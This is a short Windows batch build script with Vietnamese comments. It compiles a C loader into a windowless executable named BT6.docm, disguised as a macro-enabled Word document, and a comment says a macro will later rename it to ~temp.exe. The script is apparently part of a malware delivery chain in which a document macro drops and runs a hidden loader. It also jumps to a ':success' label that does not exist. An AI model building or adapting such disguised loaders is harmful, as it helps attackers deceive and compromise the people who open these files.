@echo off
REM Build loader thành BT6.docm (sẽ đổi tên thành ~temp.exe bởi macro)
REM Cần MinGW hoặc Visual Studio

where gcc >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] Using MinGW GCC
    goto :build_gcc
)

where cl >nul 2>&1
if %errorlevel% equ 0 (
    echo [+] Using Visual Studio
    goto :build_msvc
)

:build_gcc
echo [*] Compiling with GCC...
gcc -O2 ^
    -municode ^
    -mwindows ^
    -s ^
    src\loader.c ^
    -o BT6.docm ^
    -lbcrypt ^
    -ladvapi32

if %errorlevel% neq 0 (
    echo [-] Compilation failed!
    pause
    exit /b 1
)

goto :success

:build_msvc
echo [*] Compiling with MSVC...
cl /O2 /MT /W3 ^
   /D_UNICODE /DUNICODE ^
   src\loader.c ^
   /Fe:BT6.docm ^
   /link /SUBSYSTEM:WINDOWS ^
   bcrypt.lib advapi32.lib

if %errorlevel% neq 0 (
    echo [-] Compilation failed!
    pause
    exit /b 1
)

del *.obj 2>nul
pause